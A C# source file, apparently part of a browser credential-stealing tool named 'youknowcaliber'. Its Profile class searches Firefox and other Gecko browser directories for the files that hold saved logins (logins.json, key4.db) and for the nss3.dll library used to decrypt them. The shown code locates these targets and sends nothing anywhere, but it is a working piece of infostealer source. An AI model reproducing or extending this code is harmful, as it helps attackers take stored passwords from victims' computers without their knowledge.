using System;
using System.IO;
using System.Collections.Generic;

namespace youknowcaliber
{
    class Profile
	{

		private static string[] Concat(string[] x, string[] y)
		{
			if (x == null) throw new ArgumentNullException("x");
			if (y == null) throw new ArgumentNullException("y");
			int oldLen = x.Length;
			Array.Resize(ref x, x.Length + y.Length);
			Array.Copy(y, 0, x, oldLen, y.Length);
			return x;
		}

		// Get program files path
		private static string[] ProgramFilesChildren()
		{
			string[] children = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));

			if (8 == IntPtr.Size || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
			{
				children = Concat(children, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
			}

			return children;
		}

		// Get profile directory location
		public static string GetProfile(string path)
		{
			try
			{
				string dir = Path.Combine(path, "Profiles");
				if (Directory.Exists(dir))
					foreach (string sDir in Directory.GetDirectories(dir))
						if (File.Exists(sDir + "\\logins.json") || 
							File.Exists(sDir + "\\key4.db") || 
							File.Exists(sDir + "\\places.sqlite")) 
							return sDir;
			}
			catch (Exception ex) { Console.WriteLine("Failed to find profile\n" + ex); }
			return null;
		}

		// Get directory with nss3.dll
		public static string GetMozillaPath()
		{
			foreach (string sDir in ProgramFilesChildren())
			{
				if (File.Exists(sDir + "\\nss3.dll") &&
					File.Exists(sDir + "\\mozglue.dll"))
					return sDir;
			}
			return null;
		}

		// Get gecko based browsers path
		public static string[] GetMozillaBrowsers()
		{
			List<string> foundBrowsers = new List<string>();
			foreach (string browser in Paths.sGeckoBrowserPaths)
			{
				string bdir = Path.Combine(Paths.appdata, browser);
				if (Directory.Exists(bdir))
				{
					foundBrowsers.Add(bdir);
				}
			}
			return foundBrowsers.ToArray();
		}
	}
}
